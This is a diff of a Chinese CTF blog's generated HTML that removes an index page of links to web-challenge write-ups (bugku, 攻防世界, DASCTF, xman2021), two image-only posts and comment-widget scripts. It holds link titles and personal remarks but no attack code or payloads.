-        <p>1.[攻防世界]<br>    -<a href="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAview-source/" title="web新手区view-source">web新手区view-source</a><br>    -<a href="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BArobots/" title="web新手区robots">web新手区robots</a><br>    -<a href="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAbackup/" title="web新手区backup">web新手区backup</a><br>    -<a href="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAcookie/" title="web新手区cookie">web新手区cookie</a><br>    -<a href="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAdisabled-button/" title="web新手区disabled-button">web新手区disabled-button</a><br>    -<a href="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAweak-auth/" title="web新手区weak-auth">web新手区weak-auth</a><br>    -<a href="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAsimple-php/" title="web新手区simple-php">web新手区simple-php</a><br>    -<a href="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAget-post/" title="web新手区get-post">web新手区get-post</a><br>    -<a href="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAxff-referer/" title="web新手区xff-referer">web新手区xff-referer</a><br>    -<a href="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAwebshell/" title="web新手区webshell">web新手区webshell</a><br>    -<a href="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAcommand-execution/" title="web新手区command-execution">web新手区command-execution</a><br>    -<a href="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAsimple-js/" title="web新手区simple-js">web新手区simple-js</a><br>2.[ctfhub]<br>    -<br>    -<br>3.[bugku]<br>    -web（个人建议是：不要管bugku上的顺序，先按照原来web1-web40的顺序做，然后再做其余的题，才不那么劝退，现在bugku上第一道ssti虽然简单，但需要的知识量和经验并不少，新手根本无从下手只能抄答案，完全没有成就感）<br>    -<a href="/2021/07/30/bugku-web-Simple-SSTI-1/" title="Simple-SSTI-1">Simple-SSTI-1</a><br>    -<a href="/2021/07/30/bugku-web-Simple-SSTI-2/" title="Simple-SSTI-2">Simple-SSTI-2</a><br>    -<a href="/2021/07/30/bugku-web-Flask-FileUpload/" title="Flask_FileUpload">Flask_FileUpload</a><br>    -<a href="/2021/04/26/bugku-web-web1/" title="滑稽（web1）">滑稽（web1）</a><br>    -<a href="/2021/04/26/bugku-web-web2/" title="计算器（web2）">计算器（web2）</a><br>    -<a href="/2021/04/26/bugku-web-web3/" title="GET（web3）">GET（web3）</a><br>    -<a href="/2021/04/26/bugku-web-web4/" title="POST（web4）">POST（web4）</a><br>    -<a href="/2021/04/26/bugku-web-web5/" title="矛盾（web5）">矛盾（web5）</a><br>    -<a href="/2021/04/26/bugku-web-web6/" title="alert（web6）">alert（web6）</a><br>    -<a href="/2021/04/26/bugku-web-web7/" title="你必须让他停下（web7）">你必须让他停下（web7）</a><br>    -<a href="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/" title="社工-初步收集">社工-初步收集</a><br>    -<a href="/2021/07/31/bugku-web-game1/" title="game1">game1</a><br>    -<a href="/2021/07/31/bugku-web-%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/" title="网站被黑（web11）">网站被黑（web11）</a><br>    -<a href="/2021/07/31/bugku-web-%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98/" title="本地管理员（web12）">本地管理员（web12）</a><br>    -<a href="/2021/07/31/bugku-web-bp/" title="bp">bp</a><br>    -<a href="/2021/07/31/bugku-web-eval/" title="eval(web8)">eval(web8)</a><br>    -<a href="/2021/07/31/bugku-web-%E5%8F%98%E9%87%8F1/" title="变量1(web9)">变量1(web9)</a><br>    -<a href="/2021/07/31/bugku-web-%E5%A4%B4%E7%AD%89%E8%88%B1/" title="头等舱（web10）">头等舱（web10）</a><br>    -<a href="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A0/" title="社工-伪造">社工-伪造</a><br>    -<a href="/2021/08/12/bugku-web-source/" title="source（web40）">source（web40）</a><br>    -<a href="/2021/07/31/bugku-web-%E6%BA%90%E4%BB%A3%E7%A0%81/" title="源代码（web13）">源代码（web13）</a><br>    -<a href="/2021/07/31/bugku-web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含（web14）">文件包含（web14）</a><br>    -<a href="/2021/08/01/bugku-web-%E5%A5%BD%E5%83%8F%E9%9C%80%E8%A6%81%E5%AF%86%E7%A0%81/" title="好像需要密码（web15）">好像需要密码（web15）</a><br>    -<a href="/2021/08/01/bugku-web-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/" title="备份是个好习惯（web16）">备份是个好习惯（web16）</a><br>    -<a href="/2021/08/09/bugku-web-No-one-knows-regex-better-than-me/" title="No one knows regex better than me">No one knows regex better than me</a><br>    -<a href="/2021/08/09/bugku-web-cookies/" title="cookies（web20）">cookies（web20）</a><br>    -<a href="/2021/08/09/bugku-web-never-give-up/" title="never_give_up（web21）">never_give_up（web21）</a><br>    -<a href="/2021/08/09/bugku-web-shell/" title="shell（web22）">shell（web22）</a><br>    -<a href="/2021/08/09/bugku-web-%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/" title="成绩查询">成绩查询</a><br>    -<a href="/2021/08/09/bugku-web-%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/" title="秋名山车神（web18）">秋名山车神（web18）</a><br>    -<a href="/2021/08/09/bugku-web-%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/" title="速度要快（web19）">速度要快（web19）</a><br>    -<a href="/2021/08/09/bugku-web-%E8%81%AA%E6%98%8E%E7%9A%84php/" title="聪明的php">聪明的php</a><br>    -<a href="/2021/08/12/bugku-web-xxx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/" title="xxx二手交易市场">xxx二手交易市场</a><br>    -<a href="/2021/08/12/bugku-web-%E9%97%AA%E7%94%B5%E5%8D%81%E5%85%AD%E9%9E%AD/" title="闪电十六鞭（冬至红包）">闪电十六鞭（冬至红包）</a><br>    -<a href="#">Post not found: bugku-web-sodirty sodirty(不太懂)</a><br>    -<a href="/2021/08/10/bugku-web-%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99%EF%BC%9F/" title="字符？正则？（web23）">字符？正则？（web23）</a><br>    -<a href="/2021/08/10/bugku-web-%E5%89%8D%E5%A5%B3%E5%8F%8B/" title="前女友（web24）">前女友（web24）</a><br>    -<a href="/2021/08/10/bugku-web-login1/" title="login1（web25）">login1（web25）</a><br>    -<a href="/2021/08/10/bugku-web-%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/" title="你从哪里来（web26）">你从哪里来（web26）</a><br>    -<a href="/2021/08/10/bugku-web-md5/" title="MD5（web27）">MD5（web27）</a><br>    -<a href="/2021/08/10/bugku-web-%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99/" title="程序员本地网站（web28）">程序员本地网站（web28）</a><br>    -<a href="/2021/08/10/bugku-web-%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%93%9F/" title="各种绕过呦（web29）">各种绕过呦（web29）</a><br>    -<a href="/2021/08/12/bugku-web-file-get-contents/" title="file_get_contents（web30）">file_get_contents（web30）</a><br>    -<a href="/2021/08/12/bugku-web-%E5%AE%89%E6%85%B0%E5%A5%96/" title="安慰奖">安慰奖</a><br>    -<a href="/2021/08/11/bugku-web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传（web32）">文件上传（web32）</a><br>    -<a href="/2021/08/10/bugku-web-decrypt/" title="decrypt（web33）">decrypt（web33）</a><br>    -<a href="/2021/08/11/bugku-web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-1/" title="文件包含2（web34）">文件包含2（web34）</a><br>    -<a href="/2021/08/11/bugku-web-%E9%9C%80%E8%A6%81%E7%AE%A1%E7%90%86%E5%91%98/" title="需要管理员（web31）">需要管理员（web31）</a><br>    -<a href="/2021/07/11/bugku-web-web41-newphp/" title="newphp(web8)">newphp(web8)</a><br>    -<a href="/2021/08/10/bugku-web-%E7%82%B9login%E5%92%8B%E6%B2%A1%E5%8F%8D%E5%BA%94/" title="点login咋没反应（web35）">点login咋没反应（web35）</a><br>    -<a href="/2021/08/11/bugku-web-%E9%83%BD%E8%BF%87%E6%BB%A4%E4%BA%86/" title="都过滤了（web36）">都过滤了（web36）</a><br>    -<a href="/2021/08/11/bugku-web-login2/" title="login2（web37）">login2（web37）</a><br>    -<a href="/2021/08/11/bugku-web-sql%E6%B3%A8%E5%85%A5/" title="sql注入（web38）">sql注入（web38）</a><br>    -<a href="/2021/08/11/bugku-web-CBC/" title="CBC（web39）">CBC（web39）</a><br>    -<a href="/2021/08/11/bugku-web-getshell/" title="getshell">getshell</a><br>    -<a href="/2021/08/12/bugku-web-noteasytrick/" title="noteasytrick">noteasytrick</a></p>
-<p>4.[NepNep Winter-CAMP(涅普冬令营)]<br>    -web<br>    -<a href="/2021/03/22/%E6%B6%85%E6%99%AE%E5%86%AC%E4%BB%A4%E8%90%A5web%E7%AF%87little-trick/" title="涅普冬令营web篇little-trick">涅普冬令营web篇little-trick</a><br>    -</p>
-<p>5.[2021DASCTF实战精英夏令营暨DASCTF July X CBCTF 4th]<br>(菜鸡一个都没做出来，只能白嫖大佬的wp，万幸举办方手下留情环境没关，让我们可以整理一下wp，仅为自己整理，如果想要详细的解题步骤和查询思路，可以参考套神的博客——<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42880719/article/details/119301367?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_42880719/article/details/119301367?spm=1001.2014.3001.5501</a>)<br>（套神，yyds！！！）<br>（另外，大家细品啊：为什么“最后十分钟”能“掉4名”呢？（滑稽））</p>
-<p>-<a href="/2021/08/04/buu-ezrce/" title="ezrce">ezrce</a></p>
-<p>6.[xman2021]<br>(著名“原题搜索大赛”，抄了buu两道题（最后一道就是简单的get和post入门弱智题，就不写wp了），可惜比赛当天给忘了，11点才看到通知（8：00比到13:00），急急忙忙登录，有一道题因为电脑网络问题没弄出来，后来才找到简单做法，还是太菜了)</p>
-
-
-<p>-<a href="/2021/08/08/xman2021-easyssti/" title="easyssti">easyssti</a><br>-<a href="/2021/08/08/xman2021-easyphp/" title="easyphp">easyphp</a></p>
-<p>7.DASCTF秋季挑战赛（2021）<br>-<a href="/2021/09/25/hellouser/" title="hellouser">hellouser</a><br>-<a href="/2021/10/05/xxc/" title="xxc">xxc</a></p>
-<p>8.sqlilab</p>
-<p>9.uploadlabs</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/12/catalog/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-scr1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/12/scr1/">scr1</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/03/12/scr1/" class="archive-article-date">
-  	<time datetime="2021-03-11T23:37:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <img src="/2021/03/12/scr1/strings.jpg" class="" title="scr1">
-<img src="/2021/03/12/scr1/binwalk,foremost,dd.png" class="" title="scr2">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/12/scr1/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-scr" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/12/scr/">scr</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/03/12/scr/" class="archive-article-date">
-  	<time datetime="2021-03-11T23:26:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><img src="image/scr/strings.jpg" alt="scr"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/12/scr/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-  
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/9/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/11/">Next &amp;raquo;</a>
-    </nav>
-  
-
-
           </div>
         </div>
       </div>
@@ -1154,8 +463,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
